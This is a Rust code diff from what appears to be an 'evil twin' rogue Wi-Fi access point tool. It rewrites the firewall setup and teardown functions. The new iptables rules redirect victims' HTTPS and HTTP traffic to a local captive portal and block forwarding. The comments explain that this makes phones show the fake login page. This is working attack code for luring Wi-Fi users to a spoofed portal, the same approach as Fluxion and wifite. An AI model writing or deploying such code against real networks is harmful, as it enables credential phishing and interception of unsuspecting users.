@@ -332,24 +332,39 @@ fn write_dnsmasq_config(
 }
 
 fn enable_nat(iface: &str) -> Result<(), EvilTwinError> {
-    // Best-effort NAT enable. We don't fail the launch if iptables rejects
-    // the rule — operators may not have CAP_NET_ADMIN, in which case the
-    // portal is still reachable but won't carry outbound traffic.
+    // Captive-portal capture rules — the standard Fluxion/wifite shape:
+    //
+    // 1. NO internet: the victim must not reach the real connectivity-check
+    //    servers, or the phone concludes "online" and never pops the portal.
+    //    DNS already wildcards to us (dnsmasq address=/#/), so we only need
+    //    to keep the capture local — MASQUERADE is deliberately NOT applied.
+    // 2. Redirect HTTPS probes to the HTTP portal: Android 9+/iOS probe on
+    //    port 443 first; without this the probe dies on connection-refused
+    //    and some builds silently mark the network "no internet" without
+    //    offering a login page.
+    // 3. Everything inbound on the AP interface lands on the portal :80.
     let _ = Command::new("iptables")
-        .args(["-t", "nat", "-A", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"])
+        .args(["-t", "nat", "-A", "PREROUTING", "-i", iface, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-ports", "80"])
         .output();
     let _ = Command::new("iptables")
-        .args(["-A", "FORWARD", "-i", iface, "-j", "ACCEPT"])
+        .args(["-t", "nat", "-A", "PREROUTING", "-i", iface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", "80"])
+        .output();
+    let _ = Command::new("iptables")
+        .args(["-A", "FORWARD", "-i", iface, "-j", "DROP"])
         .output();
     Ok(())
 }
 
 fn disable_nat(iface: &str) -> Result<(), EvilTwinError> {
+    // Mirror the enable path exactly: remove what enable added.
     let _ = Command::new("iptables")
-        .args(["-t", "nat", "-D", "POSTROUTING", "-o", "eth0", "-j", "MASQUERADE"])
+        .args(["-t", "nat", "-D", "PREROUTING", "-i", iface, "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-ports", "80"])
         .output();
     let _ = Command::new("iptables")
-        .args(["-A", "FORWARD", "-i", iface, "-j", "ACCEPT"])
+        .args(["-t", "nat", "-D", "PREROUTING", "-i", iface, "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-ports", "80"])
+        .output();
+    let _ = Command::new("iptables")
+        .args(["-D", "FORWARD", "-i", iface, "-j", "DROP"])
         .output();
     Ok(())
 }
